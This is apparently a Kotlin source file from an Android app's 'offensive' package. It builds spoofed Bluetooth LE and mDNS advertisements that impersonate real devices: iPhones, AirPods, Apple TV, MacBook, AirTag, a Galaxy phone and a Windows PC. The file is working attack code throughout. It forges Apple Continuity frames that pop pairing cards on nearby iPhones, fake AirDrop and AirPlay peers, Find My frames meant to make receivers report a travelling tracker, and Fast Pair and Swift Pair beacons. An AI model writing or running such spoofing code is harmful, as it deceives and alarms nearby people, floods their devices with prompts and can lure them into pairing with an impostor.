package com.droid.whaly.offensive

/**
 * Platform personas: a coherent identity broadcast over BLE, Bluetooth Classic and mDNS
 * instead of randomised spam packets. Presence is real; the transport behind it is not.
 * AirDrop itself needs AWDL, which no stock Android radio exposes.
 */
data class Persona(
    val id: String,
    val label: String,
    val subtitle: String,
    val bluetoothName: String?,
    val mdnsTypes: List<String>,
    val payloads: List<ByteArray>,
)

object Personas {

    private const val APPLE_COMPANY_ID = 0x004C

    /** Apple Continuity frame: type byte, length byte, then the body. */
    private fun continuity(type: Int, body: ByteArray): ByteArray {
        require(body.size <= 0xFF) { "continuity body too long" }
        return byteArrayOf(type.toByte(), body.size.toByte()) + body
    }

    private fun randomBytes(size: Int): ByteArray = ByteArray(size).also { java.util.Random().nextBytes(it) }

    private fun hex(value: String): ByteArray {
        val clean = value.filterNot(Char::isWhitespace).removePrefix("0x").removePrefix("0X")
        require(clean.length % 2 == 0) { "odd hex length" }
        return ByteArray(clean.length / 2) { index ->
            clean.substring(index * 2, index * 2 + 2).toInt(16).toByte()
        }
    }

    /** 0x05 AirDrop presence. iOS lists the peer in the share sheet; transfer still needs AWDL. */
    fun airDrop(flags: Int = 0x00): ByteArray =
        continuity(0x05, byteArrayOf(flags.toByte(), 0x00) + randomBytes(22))

    /** 0x0C Handoff availability. */
    fun handoff(): ByteArray = continuity(0x0C, randomBytes(14))

    /** 0x10 Nearby Info, the frame that carries AirDrop/Handoff visibility state. */
    fun nearbyInfo(statusFlags: Int = 0xC0): ByteArray =
        continuity(0x10, byteArrayOf(statusFlags.toByte()) + randomBytes(3) + randomBytes(17))

    /** 0x09 AirPlay target, IPv4 address of the advertiser. */
    fun airPlayTarget(address: ByteArray = byteArrayOf(0xC0.toByte(), 0xA8.toByte(), 0x01, 0x64)): ByteArray =
        continuity(0x09, byteArrayOf(0x01) + address)

    /** 0x07 proximity pair payload used for AirPods and Beats. */
    fun proximityPair(modelHex: String, colorHex: String = "00"): ByteArray {
        val model = hex(modelHex)
        val buds = byteArrayOf(((java.util.Random().nextInt(10) shl 4) or java.util.Random().nextInt(10)).toByte())
        val case = byteArrayOf(((java.util.Random().nextInt(8) shl 4) or java.util.Random().nextInt(10)).toByte())
        return continuity(
            0x07,
            byteArrayOf(0x01) + model + byteArrayOf(0x55) + buds + case + randomBytes(1) + hex(colorHex) +
                byteArrayOf(0x00) + randomBytes(16),
        )
    }

    /** 0x12 Find My network frame. Rotating keys make receivers report a travelling tracker. */
    fun findMy(status: Int = 0x00): ByteArray =
        continuity(0x12, byteArrayOf(status.toByte()) + randomBytes(22))

    /** Fast Pair service data for the Android persona. */
    fun fastPair(modelId: Int): ByteArray {
        val id = byteArrayOf((modelId shr 16).toByte(), (modelId shr 8).toByte(), modelId.toByte())
        return byteArrayOf(0x00) + id + randomBytes(3)
    }

    val all: List<Persona> = listOf(
        Persona(
            id = "iphone",
            label = "iPhone 15 Pro",
            subtitle = "AirDrop + Handoff + Nearby Info",
            bluetoothName = "iPhone 15 Pro",
            mdnsTypes = listOf("_airdrop._tcp", "_companion-link._tcp"),
            payloads = listOf(airDrop(0x00), nearbyInfo(0xC0), handoff()),
        ),
        Persona(
            id = "airpods",
            label = "AirPods Pro 2",
            subtitle = "Proximity pairing card on every nearby iPhone",
            bluetoothName = "AirPods Pro",
            mdnsTypes = listOf("_airplay._tcp"),
            payloads = listOf(proximityPair("1420"), proximityPair("2420"), proximityPair("0E20")),
        ),
        Persona(
            id = "appletv",
            label = "Apple TV 4K",
            subtitle = "AirPlay receiver in Control Center",
            bluetoothName = "Living Room",
            mdnsTypes = listOf("_airplay._tcp", "_raop._tcp", "_airdrop._tcp"),
            payloads = listOf(airPlayTarget(), nearbyInfo(0x40), handoff()),
        ),
        Persona(
            id = "macbook",
            label = "MacBook Pro",
            subtitle = "Handoff and Universal Clipboard peer",
            bluetoothName = "MacBook Pro",
            mdnsTypes = listOf("_companion-link._tcp", "_airdrop._tcp"),
            payloads = listOf(handoff(), nearbyInfo(0xC0), airDrop(0x01)),
        ),
        Persona(
            id = "airtag",
            label = "AirTag",
            subtitle = "Find My tracker that follows the room",
            bluetoothName = null,
            mdnsTypes = emptyList(),
            payloads = listOf(findMy(0x00), findMy(0x10)),
        ),
        Persona(
            id = "galaxy",
            label = "Galaxy S24 Ultra",
            subtitle = "Fast Pair + Android beacon",
            bluetoothName = "Galaxy S24 Ultra",
            mdnsTypes = listOf("_googlecast._tcp"),
            payloads = listOf(fastPair(0x0000F0), fastPair(0x0000D0)),
        ),
        Persona(
            id = "windows",
            label = "Windows 11 PC",
            subtitle = "Swift Pair beacon",
            bluetoothName = "DESKTOP-WHALY",
            mdnsTypes = emptyList(),
            payloads = listOf(hex("0303 0102 0304 0506 0708")),
        ),
    )

    fun byId(id: String): Persona? = all.firstOrNull { it.id == id }

    /** Company id used for the manufacturer data section of a persona frame. */
    fun companyIdFor(persona: Persona): Int =
        if (persona.id == "galaxy") 0x00E0 else if (persona.id == "windows") 0x0006 else APPLE_COMPANY_ID
}
